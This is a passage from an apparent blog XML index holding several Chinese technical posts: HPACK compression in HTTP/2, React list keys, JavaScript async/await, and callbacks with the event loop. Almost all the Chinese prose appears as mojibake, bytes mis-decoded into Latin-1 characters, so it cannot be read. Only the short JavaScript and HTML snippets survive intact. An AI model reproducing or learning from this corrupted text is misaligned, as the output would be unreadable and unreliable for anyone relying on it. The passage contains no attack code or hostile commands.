¼å¼æ”¯æŒé€šè¿‡é™æ€ Huffman ä»£ç å¯¹ä¼ è¾“çš„æ ‡å¤´å­—æ®µè¿›è¡Œç¼–ç ï¼Œä»è€Œå‡å°äº†å„ä¸ªä¼ è¾“çš„å¤§å°ã€‚ è¿™ç§æ ¼å¼è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤å’Œæ›´æ–°ä¸€ä¸ªåŒ…å«ä¹‹å‰è§è¿‡çš„æ ‡å¤´å­—æ®µçš„ç´¢å¼•åˆ—è¡¨ï¼ˆæ¢å¥è¯è¯´ï¼Œå®ƒå¯ä»¥å»ºç«‹ä¸€ä¸ªå…±äº«çš„å‹ç¼©ä¸Šä¸‹æ–‡ï¼‰ï¼Œæ­¤åˆ—è¡¨éšåä¼šç”¨ä½œå‚è€ƒï¼Œå¯¹ä¹‹å‰ä¼ è¾“å€¼è¿›è¡Œæœ‰æ•ˆç¼–ç ã€‚ åˆ©ç”¨ Huffman ç¼–ç ï¼Œå¯ä»¥åœ¨ä¼ è¾“æ—¶å¯¹å„ä¸ªå€¼è¿›è¡Œå‹ç¼©ï¼Œè€Œåˆ©ç”¨ä¹‹å‰ä¼ è¾“å€¼çš„ç´¢å¼•åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ è¾“ç´¢å¼•å€¼çš„æ–¹å¼å¯¹é‡å¤å€¼è¿›è¡Œç¼–ç ï¼Œç´¢å¼•å€¼å¯ä»¥ç”¨äºæœ‰æ•ˆæŸ¥è¯¢å’Œé‡æ„å®Œæ•´çš„æ ‡å¤´é”®å€¼å¯¹ã€‚ ä½œä¸ºä¸€ç§è¿›ä¸€æ­¥ä¼˜åŒ–æ–¹å¼ï¼ŒHPACK å‹ç¼©ä¸Šä¸‹æ–‡åŒ…å«ä¸€ä¸ªé™æ€è¡¨å’Œä¸€ä¸ªåŠ¨æ€è¡¨ï¼šé™æ€è¡¨åœ¨è§„èŒƒä¸­å®šä¹‰ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªåŒ…å«æ‰€æœ‰è¿æ¥éƒ½å¯èƒ½ä½¿ç”¨çš„å¸¸ç”¨ HTTP æ ‡å¤´å­—æ®µï¼ˆä¾‹å¦‚ï¼Œæœ‰æ•ˆæ ‡å¤´åç§°ï¼‰çš„åˆ—è¡¨ï¼›åŠ¨æ€è¡¨æœ€åˆå€¼ä¸ºç©ºï¼Œå°†æ ¹æ®åœ¨ç‰¹å®šè¿æ¥å†…äº¤æ¢çš„å€¼è¿›è¡Œæ›´æ–°ã€‚å› æ­¤ï¼Œä¸ºä¹‹å‰æœªè§è¿‡çš„å€¼é‡‡ç”¨é™æ€ Huffman ç¼–ç ï¼Œå¹¶æ›¿æ¢æ¯ä¸€ä¾§é™æ€è¡¨æˆ–åŠ¨æ€è¡¨ä¸­å·²å­˜åœ¨çš„ç´¢å¼•ï¼Œå¯ä»¥å‡å°æ¯ä¸ªè¯·æ±‚çš„å¤§å°ã€‚ æ³¨ï¼šåœ¨ HTTP/2 ä¸­ï¼Œè¯·æ±‚å’Œå“åº”æ ‡å¤´å­—æ®µçš„å®šä¹‰ä¿æŒä¸å˜ï¼Œä»…æœ‰äº›å¾®å°å·®å¼‚ï¼šæ‰€æœ‰çš„æ ‡å¤´å­—æ®µåç§°å‡ä¸ºå°å†™ï¼Œè¯·æ±‚è¡Œç°åœ¨æ‹†åˆ†ä¸ºå„ä¸ª :methodã€:schemeã€:authority å’Œ :path ä¼ªæ ‡å¤´å­—æ®µã€‚ HPACK å®‰å…¨æ€§å’Œæ€§èƒ½ æ—©æœŸç‰ˆæœ¬çš„ HTTP/2 å’Œ SPDY éƒ½ä½¿ç”¨ zlib (å¸¦æœ‰ä¸€ä¸ªè‡ªå®šä¹‰å­—å…¸) å‹ç¼©æ‰€æœ‰ HTTP æ ‡å¤´ã€‚è¿™ç§æ–¹å¼å¯ä»¥å°†æ‰€ä¼ è¾“æ ‡å¤´æ•°æ®çš„å¤§å°å‡å° 85%-88%ï¼Œæ˜¾è‘—å‡å°‘äº†é¡µé¢åŠ è½½æ—¶é—´å»¶è¿Ÿï¼š åœ¨å®½å¸¦è¾ƒä½çš„ DSL é“¾è·¯ä¸­ï¼Œä¸Šè¡Œé“¾è·¯é€Ÿåº¦ä»…æœ‰ 375 Kbpsï¼Œä»…å‹ç¼©è¯·æ±‚æ ‡å¤´å°±æ˜¾è‘—å‡å°‘äº†ç‰¹å®šç½‘ç«™ï¼ˆå³ï¼Œå‘å‡ºå¤§é‡èµ„æºè¯·æ±‚çš„ç½‘ç«™ï¼‰çš„é¡µé¢åŠ è½½æ—¶é—´ã€‚æˆ‘ä»¬å‘ç°ï¼Œä»…ä»…ç”±äºæ ‡å¤´å‹ç¼©ï¼Œé¡µé¢åŠ è½½æ—¶é—´å°±å°‘äº† 45-1142 æ¯«ç§’ã€‚ ç„¶è€Œï¼Œ2012 å¹´å¤å¤©ï¼Œå‡ºç°äº†é’ˆå¯¹ TLS å’Œ SPDY å‹ç¼©ç®—æ³•çš„â€œçŠ¯ç½ªâ€å®‰å…¨æ”»å‡»ï¼Œæ­¤æ”»å‡»ä¼šå¯¼è‡´ä¼šè¯è¢«åŠ«æŒã€‚äºæ˜¯ï¼Œzlib ç®—æ³•è¢« HPACK ä»£æ›¿ï¼Œåè€…ç»è¿‡ä¸“é—¨è®¾è®¡ï¼Œå¯ä»¥è§£å†³å‘ç°çš„å®‰å…¨é—®é¢˜ã€å®ç°èµ·æ¥ä¹Ÿæ›´é«˜æ•ˆç®€å•ï¼Œå½“ç„¶ï¼Œå¯ä»¥å¯¹ HTTP æ ‡å¤´å…ƒæ•°æ®è¿›è¡Œè‰¯å¥½å‹ç¼©ã€‚ å¦‚éœ€äº†è§£æœ‰å…³ HPACK å‹ç¼©ç®—æ³•çš„å®Œæ•´è¯¦æƒ…ï¼Œè¯·å‚é˜… https://tools.ietf.org/html/draft-ietf-httpbis-header-compressionã€‚ æ·±å…¥é˜…è¯» â€œHTTP/2â€ å·²ç»ç²‰å¢¨ç™»åœºï¼Œæˆ‘ä»¬ä¸€èµ·ä¼˜åŒ–æ€§èƒ½å§ï¼â€]]></content>
      <categories>
        <category>http/2</category>
      </categories>
      <tags>
        <tag>http/2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react key]]></title>
    <url>%2Freact%20key%2F</url>
    <content type="text"><![CDATA[react æ ¸å¿ƒå¼€å‘äººå‘˜è¯´ä¹‹åå¯èƒ½ä¸å†éœ€è¦ keyï¼Œè¶å®ƒè¿˜åœ¨èµ¶ç´§å»äº†è§£ä¸€æ³¼ï¼Œé€ƒï½ï½ï½ æœ¬æ–‡æ€è·¯ï¼š ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ key ä½¿ç”¨ key çš„æ­£ç¡®æ–¹å¼ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ keyï¼Ÿ ç®€å•æ¥è¯´ï¼Œè¿™å’Œ react çš„ diff ç®—æ³•æœ‰å…³ï¼Œç”¨äºæé«˜ react å¤„ç†åˆ—è¡¨çš„æ€§èƒ½ã€‚ ä¸ºä»€ä¹ˆä½¿ç”¨äº† key å°±å¯ä»¥æé«˜å¤„ç†åˆ—è¡¨çš„æ€§èƒ½å‘¢ï¼Ÿ ä¾‹å¦‚ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å½“å‰åˆ—è¡¨æœ«å°¾æ’å…¥ä¸€ä¸ªæ–°çš„å…ƒç´ ï¼š 123456789101112&lt;!-- åŸå§‹åˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li&gt;å—å®«ç‡•&lt;/li&gt;&lt;/ul&gt;&lt;!-- æ›´æ–°ååˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li&gt;å—å®«ç‡•&lt;/li&gt; &lt;li&gt;é›ªé¸¢å¿ƒ&lt;/li&gt;&lt;/ul&gt; åœ¨æ–°æ—§ dom æ ‘ diff è¿‡ç¨‹ä¸­ï¼Œå‘ç°å‰ä¸¤ä¸ªåˆ—è¡¨å­èŠ‚ç‚¹ï¼ˆ &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; å’Œ &lt;li&gt;å—å®«ç‡•&lt;/li&gt; ï¼‰ç›¸åŒï¼Œå¦‚æ˜¯ç›´æ¥æ’å…¥ &lt;li&gt;é›ªé¸¢å¿ƒ&lt;/li&gt; è¿™ä¸ªèŠ‚ç‚¹å®Œäº‹ ä½†æ˜¯ï¼ˆé‡ç‚¹éƒ½åœ¨â€ä½†æ˜¯â€åï¼‰ï¼Œå¦‚æœæˆ‘åœ¨åˆ—è¡¨å‰é¢æ’å…¥ä¸€ä¸ªå…ƒç´ ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ 123456789101112&lt;!-- åŸå§‹åˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li&gt;å—å®«ç‡•&lt;/li&gt;&lt;/ul&gt;&lt;!-- æ›´æ–°ååˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li&gt;é›ªé¸¢å¿ƒ&lt;/li&gt; &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li&gt;å—å®«ç‡•&lt;/li&gt;&lt;/ul&gt; react å°†ä¼šæ”¹å˜æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯ä¿ç•™ &lt;li&gt;å†¬ç¬‘é&lt;/li&gt; å’Œ &lt;li&gt;å—å®«ç‡•&lt;/li&gt; è¿™ä¸¤ä¸ªèŠ‚ç‚¹ã€‚è¿™ç§å¤„ç†æ–¹å¼ä¼šå¯¼è‡´ä¸€å®šçš„æ€§èƒ½é—®é¢˜ã€‚ï¼ˆä½ å¯èƒ½ä¼šè§‰å¾—ä¸€ä¸ª li èƒ½é€ æˆä»€ä¹ˆæ€§èƒ½å½±å“å‘¢ï¼Ÿæƒ³æƒ³åœ¨å®é™…æƒ…å†µä¸‹ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªå•†å“åˆ—è¡¨é¡µï¼Œç„¶åä½ ä¼šæ‡‚çš„ï¼‰ ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œreact æä¾›äº†ä¸€ä¸ªç§°ä¸º key çš„å±æ€§ã€‚ 123456789101112&lt;!-- åŸå§‹åˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li key="doxiu"&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li key="niye"&gt;å—å®«ç‡•&lt;/li&gt;&lt;/ul&gt;&lt;!-- æ›´æ–°ååˆ—è¡¨ --&gt;&lt;ul&gt; &lt;li key="xueyx"&gt;é›ªé¸¢å¿ƒ&lt;/li&gt; &lt;li key="doxiu"&gt;å†¬ç¬‘é&lt;/li&gt; &lt;li key="niye"&gt;å—å®«ç‡•&lt;/li&gt;&lt;/ul&gt; è¿™æ · react ä¼šå‘ç° key ä¸º doxiuã€niye çš„èŠ‚ç‚¹å¹¶æ²¡æœ‰æ”¹å˜ï¼Œåªéœ€ç§»åŠ¨ä¸€ä¸‹ä½ç½®ï¼Œå†æ–°å¢ä¸€ä¸ª key=â€xueyxâ€ çš„èŠ‚ç‚¹ã€‚ react ä½¿ç”¨ key è¯†åˆ«åˆ—è¡¨å­èŠ‚ç‚¹ï¼Œè¿›è€Œå¯¹èŠ‚ç‚¹è¿›è¡Œå¢åˆ æ”¹æ“ä½œã€‚å¦‚æœ key å˜æ›´ï¼Œreact ä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªæ–°èŠ‚ç‚¹ã€‚ ä½¿ç”¨ key çš„æ­£ç¡®æ–¹å¼ æ—¢ç„¶ key ç”¨äºæ ‡è¯†åˆ—è¡¨ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè‡ªç„¶ key åº”è¯¥åœ¨å½“å‰åˆ—è¡¨å”¯ä¸€ï¼ˆä¸éœ€è¦å…¨å±€å”¯ä¸€ï¼‰ï¼Œå¹¶ä¸”ä¿æŒç¨³å®šã€‚ å¦‚æœåŒä¸€ä¸ªåˆ—è¡¨å­èŠ‚ç‚¹çš„ key ä¸æ–­çš„å˜æ›´ï¼Œreact ä¼šè®¤ä¸ºå®ƒæ€»æ˜¯ä¸€ä¸ªæ–°èŠ‚ç‚¹ã€‚ æ‰€ä»¥ä½¿ç”¨ key çš„æ—¶å€™ï¼š å¦‚æœæ•°æ®æœ¬èº«å¸¦æœ‰ id å°½é‡ä½¿ç”¨ id ä½œä¸º key å¦‚æœæ•°æ®æœ¬èº«ä¸å¸¦ id ï¼Œå¹¶ä¸”éœ€è¦ç»å¸¸æ›´æ–°åˆ—è¡¨ï¼Œéœ€è¦ä¸ºæ¯ä¸ªå­èŠ‚ç‚¹æ„é€ ä¸€ä¸ªå”¯ä¸€ keyï¼Œä½¿ç”¨ hash æ–¹æ³•ç­‰ å¦‚æœæ•°æ®æœ¬èº«ä¸å¸¦ idï¼Œå¹¶ä¸”æ•°æ®ä¸æ€ä¹ˆæ›´æ–°ï¼Œä½¿ç”¨æ•°æ® index ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ è¿™ç§æ–¹å¼ç›¸å½“äºäººå·¥ä¼˜åŒ–ç®—æ³•ï¼Œæœ‰ç‚¹å˜æ‰­ï½ï½ ä¸è¿‡å‰æ–‡ä¹Ÿè¯´äº†ï¼Œä¹‹åå¯èƒ½ä¸ç”¨å†å†™ key äº†ã€æœŸå¾…è„¸ã€‘]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>key</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js å¼‚æ­¥è¿›åŒ–å²ä¹‹async]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8Basync%2F</url>
    <content type="text"><![CDATA[æˆ‘ä»¬çš„ js å¤„ç†çš„å¼‚æ­¥çš„æ–¹å¼ä¸æ–­è¿›åŒ–ï¼Œç°åœ¨å·²ç»åˆ°äº†ç¬¬å››ä»£ï¼Œæœ€å¼ºä¹‹ async ä»€ä¹ˆæ˜¯ asyncï¼Ÿ async å®šä¹‰äº†ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œå¹¶æ€»æ˜¯è¿”å›ä¸€ä¸ª Promiseã€‚å½“æ‰§è¡Œåˆ° await è¡¨è¾¾å¼ï¼Œasync å‡½æ•°ä¼šæš‚åœæ‰§è¡Œï¼Œç­‰å¾…è¡¨è¾¾å¼ä¸­çš„ Promise å†³è®®åï¼Œasync å†ç»§ç»­æ‰§è¡Œã€‚ ä¸Šä¸€ç¯‡ jså¼‚æ­¥è¿›åŒ–å²ä¹‹Generator ä»£ç ï¼Œç”¨åŒæ­¥çš„æ–¹å¼ç¼–å†™å¼‚æ­¥ä»£ç ï¼Œè¦åšåˆ°æ–¹ä¾¿ä½¿ç”¨ï¼Œéœ€è¦å¼•å…¥é¢å¤–çš„åº“ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567const co = require('co');co(function* ()&#123; let text = yield requst('http://example.com') console.log(text);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); ç°åœ¨æˆ‘ä»¬ç”¨ async æ”¹å†™ä¸€ä¸‹ 1234567async function foo() &#123; try &#123; let text = await requst('http://example.com'); &#125; catch(err) &#123; console.log(err); &#125;&#125; æ˜¯ä¸æ˜¯æ›´é€†å¤©ï¼Œä¸éœ€è¦é¢å¤–å¼•å…¥å‡½æ•°åº“ï¼Œä¹Ÿæ²¡æœ‰ co ä»€ä¹ˆçš„ï¼Œç›´æ¥åŸç”Ÿ js æ”¯æŒã€‚ å“å‘€ï¼Œçˆ±æ­» js äº†ï¼Œçˆ±æ­» ES å·¥ä½œç»„äººå‘˜äº†ã€‚ async è¿”å›å€¼ async çš„å®šä¹‰è¡¨æ˜ï¼Œasync æ€»æ˜¯è¿”å›ä¸€ä¸ª Promiseã€‚å…¶å®å°±åƒè¿™æ · 123async function foo() &#123; return Promise.resolve(value);&#125; ç”¨ Promise.resolve åŒ…è£…è¿”å›ç»“æœï¼Œæ–°å»ºä¸€ä¸ª Promiseã€‚ä¸æ¸…æ¥š Promise çš„å¯ä»¥çœ‹ js å¼‚æ­¥è¿›åŒ–å²ä¹‹Promise async å¹¶å‘ ç›´æ¥ä¸Šä»£ç å§ 1234567891011const p1 = requst('http://example.com?index=1');const p2 = requst('http://example.com?index=2');const p3 = requst('http://example.com?index=3');async function foo() &#123; try &#123; let text = await Promise.all([p1, p2, p3]); &#125; catch(err) &#123; console.log(err); &#125;&#125; å“‡ï½ nice! nice! nice! æœ€åæœ€åçš„æœ€å è¿æ›´å››ç¯‡åšå®¢ å›è°ƒ &gt; promise &gt; generator &gt; async çœŸçš„ç´¯å‘€ï½ è€Œä¸”è¿˜æ˜¯å†™çš„å†°å±±ä¸€è§’ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹ ES å·¥ä½œç»„çš„äººå‘˜èŠ±è´¹äº†å¤šå°‘å¿ƒè¡€ ES å·¥ä½œç»„çš„æˆå‘˜ï¼Œä»¥åŠå‚ä¸ ES æ”¹è¿›çš„å¹¿å¤§ç¤¾åŒºæœ‹å‹ä»¬å¹¸è‹¦äº†ï¼ï¼ï¼è‡´æ•¬]]></content>
      <categories>
        <category>å¼‚æ­¥</category>
      </categories>
      <tags>
        <tag>async/await</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js å¼‚æ­¥è¿›åŒ–å²ä¹‹å›è°ƒ]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8B%E5%9B%9E%E8%B0%83%2F</url>
    <content type="text"><![CDATA[äººç±»åœ¨ä»£ä»£ç›¸ä¼ ä¸­ä¸æ–­è¿›åŒ–ï¼Œä¸–é—´ä¸‡ç‰©å¾ˆå¤šéƒ½æ˜¯å¦‚æ­¤ï¼Œå·²ä¸æ–­é€‚åº”èµ–ä»¥ç”Ÿå­˜çš„ç¯å¢ƒ ã€‚ç‰©ç«å¤©æ‹©ï¼Œæœ‰äº›é€‚åº”ä¸äº†æ–°ç”Ÿç¯å¢ƒçš„è‡ªç„¶å°±ä¼šé€æ¸è¢«æ·˜æ±°ã€‚ç¼–ç¨‹è¯­è¨€ä¹Ÿä¸€æ ·ï¼Œå¤§åˆ°æ•´ä¸ªç¼–ç¨‹è¯­è¨€çš„ç‰ˆæœ¬å‡çº§ï¼Œå°åˆ°è¯­è¨€å†…éƒ¨ä¸€äº›ç‰¹æ€§çš„å‡çº§ã€‚ä»Šå¤©æˆ‘ä»¬å°±æ¥çœ‹çœ‹ js è¯­è¨€çš„å¼‚æ­¥è¿›åŒ–è¿‡ç¨‹ã€‚ ä»€ä¹ˆæ˜¯å¼‚æ­¥ï¼Ÿ å¾ˆå¤šäººå°†â€œå¼‚æ­¥â€å’Œâ€œå¹¶è¡Œâ€æ··æ·†åœ¨ä¸€èµ·ï¼Œæ¯”å¦‚ï¼š 1234567891011let data1 = ajax("http://example.com?index=1", function success(data) &#123; console.log(data)&#125;);let data2 = ajax("http://example.com?index=2", function success(data) &#123; console.log(data)&#125;);function func(cb) &#123; cb(); console.log('æˆ‘æ˜¯åŒæ­¥å‡½æ•°ï¼Œä¼šä¸é—´æ–­è¿è¡Œ^_^')&#125; è¯´è¿™ä¸¤ä¸ª ajax è¯·æ±‚æ˜¯å¹¶è¡Œçš„å¯èƒ½æ˜¯å¯¹çš„ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½å‡ ä¹æ˜¯åŒä¸€æ—¶é—´å‘é€å‡ºå»çš„ã€‚ æ³¨ï¼šç”±äºæŸäº›åŸå› çš„é™åˆ¶ï¼Œæ¯”å¦‚å½“é‡‡ç”¨ http/1.x çš„æ—¶å€™ï¼Œå—åˆ°æµè§ˆå™¨çš„æœ€å¤§è¿æ¥æ•°çš„é™åˆ¶ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬æš‚ä¸”è®¤ä¸ºå®ƒä»¬æ˜¯å¹¶è¡Œçš„ã€‚ ä»å¦å¤–ä¸€ä¸ªè§†è§‰åˆ†æï¼Œæˆ‘ä»¬å•å•åˆ†æç¬¬ä¸€ä¸ª ajax è¯·æ±‚ï¼Œå®ƒä¸æ˜¯é©¬ä¸Šå¾—åˆ°å“åº”çš„ï¼Œdata1 ä¼šæ˜¯ undefinedï¼Œsuccess æ–¹æ³•ä¹Ÿä¸ä¼šé©¬ä¸Šå¾—åˆ°æ‰§è¡Œï¼Œè€Œæ˜¯è¿‡ä¸€ä¸ªæ—¶é—´é—´éš™åï¼ŒæœåŠ¡å™¨è¿”å›äº†æ•°æ®ã€‚å†å¯¹ success æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚æ˜æ˜¾æœ‰ä¸€ä¸ªæ—¶é—´é—´éš”ï¼Œä¸ä¼šåƒ func ä¸€æ ·ä¸€å£æ°”æ‰§è¡Œå®Œã€‚ æ‰€ä»¥ï¼Œä¸è¦å°†â€œå¼‚æ­¥â€å’Œâ€œå¹¶è¡Œâ€æ··æ·†åœ¨ä¸€èµ·ï¼Œå¹¶è¡ŒæŒ‡çš„æ˜¯åŒä¸€æ—¶é—´æ‰§è¡Œå¤šä¸ªç¨‹åºå—ï¼Œè€Œå¼‚æ­¥æ˜¯æŒ‡ï¼Œâ€œç°åœ¨â€æ‰§è¡Œä¸€éƒ¨åˆ†ï¼Œå¾…â€œå°†æ¥â€æ¡ä»¶æ»¡è¶³äº†å†æ‰§è¡Œå¦å¤–ä¸€éƒ¨åˆ†ã€‚â€œç°åœ¨â€å’Œâ€œå°†æ¥â€æœ‰ä¸€ä¸ªæ—¶é—´é—´éš™ã€‚ä¸¤è€…æ¦‚å¿µä¸åŒã€‚ ä¸ºä»€ä¹ˆè¦å¼‚æ­¥ï¼Ÿ æœ‰ç›®çš„åšäº‹æ‰æœ‰æ–¹å‘çš„å˜›ï¼Œé‚£ä¸ºä»€ä¹ˆè¦å¼‚æ­¥å‘¢ï¼Ÿ å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ª ajax è¯·æ±‚ï¼Œä¸é‡‡ç”¨å¼‚æ­¥çš„æ–¹å¼å¤„ç†ï¼Œè€Œæ˜¯é‡‡ç”¨åŒæ­¥ç­‰å¾…çš„å¤„ç†æ–¹å¼ã€‚å› ä¸º js çš„å•çº¿ç¨‹ç‰¹æ€§ï¼ŒåŒæ­¥ç­‰å¾…ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯ä¸èƒ½å“åº”ç”¨æˆ·çš„å…¶ä»–æ“ä½œï¼Œç”šè‡³é¡µé¢ä¸Šçš„å°åŠ¨ç”»ä¹Ÿåœäº†ï¼Œå½·ä½›ä¸–ç•Œæœ«æ—¥ã€‚ æ³¨ï¼šjs ä¹‹æ‰€ä»¥é‡‡ç”¨å•çº¿ç¨‹ï¼Œæ˜¯å› ä¸ºå¤šçº¿ç¨‹ç¼–ç¨‹æ˜¯éå¸¸å¤æ‚çš„ã€‚è‡³äºä¸ºä»€ä¹ˆå¤æ‚ï¼Œå·²æ˜¯é¢˜å¤–è¯ï¼Œè¯·è‡ªè¡Œ googleã€‚ æ‰€ä»¥å¼‚æ­¥å°±è¢«éœ€è¦éœ€è¦äº†ã€‚å½“ä½ å‘èµ· ajax è¯·æ±‚çš„æ—¶å€™ï¼Œå…ˆæŠŠå½“å‰ç¨‹åºå—â€œæŒ‚èµ·â€ï¼Œå®¢æˆ·ç«¯å…ˆå¤„ç†å…¶ä»–ç”¨æˆ·äº¤äº’ï¼Œç­‰æœåŠ¡å™¨å“åº”æ•°æ®åˆ°äº†ï¼Œåœ¨å›è¿‡å¤´æ¥ç»§ç»­æ‰§è¡Œä¹‹å‰çš„â€œæŒ‚èµ·â€çš„ç¨‹åºå—ã€‚ 123ajax("http://example.com?index=1", function success(data) &#123; console.log(data); // è·å–åˆ°æœåŠ¡å™¨å“åº”çš„æ•°æ®&#125;); é‚£ä¹ˆå¼‚æ­¥çš„ä»£ç å—åˆæ˜¯å¦‚ä½•åœ¨æ°å½“çš„æ—¶å€™æ”¾å…¥ js å¼•æ“ä¸­è§£ææ‰§è¡Œçš„å‘¢ï¼Ÿäº‹ä»¶å¾ªç¯ äº‹ä»¶å¾ªç¯ ä»€ä¹ˆæ˜¯äº‹ä»¶å¾ªç¯å‘¢ï¼Ÿæˆ‘ä»¬ç”¨ä¸€æ®µä¼ªä»£ç æ¥è¯ é‡Šä¸€ä¸‹è¿™ä¸ªæ¦‚å¿µï¼š 1234567891011const eventLoop =[];while(true) &#123; if (eventLoop.length &gt; 0) &#123; const event = eventLoop.shift(); try &#123; event(); &#125; catch(err) &#123; console.log(err); &#125; &#125;&#125; å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªæ¦‚å¿µï¼Œä¸æ–­å–å‡ºé˜Ÿåˆ—é‡Œé¢çš„äº‹ä»¶ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ”¾å…¥ js å¼•æ“æ‰§è¡Œã€‚æ¯ä¸€æ¬¡å¾ªç¯ç§°ä¸ºï¼Œtickã€‚ ä½†æ˜¯é˜Ÿåˆ—é‡Œé¢çš„äº‹ä»¶å“ªé‡Œæ¥å‘¢ï¼Ÿç¨‹åºé€šå¸¸æ˜¯åˆ†æˆå¾ˆå¤šå°çš„å—ï¼Œæ”¾å…¥äº‹ä»¶å¾ªç¯é˜Ÿåˆ—ä¸­ä¸€ä¸ªä¸ªè¢«æ‰§è¡Œçš„ã€‚æ¯”å¦‚ï¼š 123setTimeout(function time() &#123; console.log("å—¨! æˆ‘å°†åœ¨ 1 ç§’åè¢«è°ƒç”¨");&#125;, 1000) åœ¨åˆ°äº† 1000ms åï¼Œå®¿ä¸»ç¯å¢ƒå°±ä¼šå°†å›è°ƒå‡½æ•°æ”¾å…¥ï¼ˆæ­¤æ—¶å¼‚æ­¥æ˜¯é€šè¿‡å›è°ƒå®ç°çš„ï¼‰äº‹ä»¶é˜Ÿåˆ—ä¸­ã€‚åˆä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯å‘èµ· ajax è¯·æ±‚ï¼Œå®¿ä¸»ç¯å¢ƒç›‘å¬åˆ°æœåŠ¡å™¨å“åº”åˆ°æ¥åï¼Œå°†å›è°ƒå‡½æ•°æ”¾å…¥äº‹ä»¶é˜Ÿåˆ—ç­‰å¾…æ‰§è¡Œã€‚ ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœæ­¤æ—¶äº‹ä»¶é˜Ÿåˆ—ä¸­æœ‰ 10 ä¸ªäº‹ä»¶ç­‰å¾…æ‰§è¡Œã€‚é‚£ä¹ˆ setTimeout çš„å›è°ƒå‡½æ•°å°±ä¸ä¼šå¾—åˆ°ç«‹å³æ‰§è¡Œã€‚è¿™ä¹Ÿæ˜¯ setTimeout çš„ç²¾ç¡®åº¦ä¸é«˜çš„åŸå› ã€‚ è¿™ä¹Ÿæ˜¯ä¸‹é¢çš„ä»£ç è°ƒç”¨ setTimeout 1000 æ¬¡ï¼Œä¸ä¼š 1000 é©¬ä¸Šä¸€èµ·æ‰§è¡Œçš„åŸå› ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªæ¥: 12345for(let i = 0; i &lt; 1000; i++) &#123; setTimeout(function time() &#123; console.log("å—¨! æˆ‘åˆæ¥äº†"); &#125;, 0)&#125; ä»€ä¹ˆæ˜¯å›è°ƒï¼Ÿ è¯´äº†è¿™ä¹ˆå¤šï¼Œç»ˆäºè½®åˆ°äº†æˆ‘ä»¬ä»Šå¤©çš„ä¸»è§’å›è°ƒã€‚ js æœ€åŸå§‹çš„æ‰§è¡Œå¼‚æ­¥çš„æ“ä½œå³æ˜¯ï¼šå›è°ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†éœ€è¦å¼‚æ­¥æ‰§è¡Œçš„ä»£ç ï¼Œå°è£…è¿›ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œå¾…åˆ°æ‰§è¡Œçš„æ—¶æœºæˆç†Ÿï¼Œå°†æ­¤å‡½æ•°æ”¾å…¥äº‹ä»¶å¾ªç¯ä¸­ã€‚æ­¤å‡½æ•°å°±å«ï¼šå¼‚æ­¥å›è°ƒå‡½æ•°ã€‚ å…¶ä»–çš„æˆ‘ä»¬å°±ä¸ç®¡äº†ï¼Œä¸ºäº†ç®€å•ï¼Œè¿™é‡Œå°†å¼‚æ­¥å›è°ƒå‡½æ•°ï¼Œç®€ç§°ï¼šå›è°ƒã€‚ ä½ æ‡‚äº†æ²¡ï¼Ÿ åæ­£æˆ‘æ˜¯æœ‰ç‚¹äº‘é‡Œé›¾é‡ŒğŸ˜” ç›´æ¥ä¸Šä»£ç å§ï¼š 1234567891011121314// success æ˜¯ä¸€ä¸ªå›è°ƒajax("http://example.com?index=1", function success(data) &#123; console.log(data);&#125;);// func æ˜¯ä¸€ä¸ªå›è°ƒsetTimeout(function func() &#123; console.log('hello')&#125;, 1000)// clickEvent æ˜¯ä¸€ä¸ªå›è°ƒ$.on('click', function clickEvent() &#123; console.log('click');&#125;, false) å›è°ƒé—®é¢˜ä¹‹å›è°ƒåœ°ç‹± ä¸Šé¢çš„ä»£ç 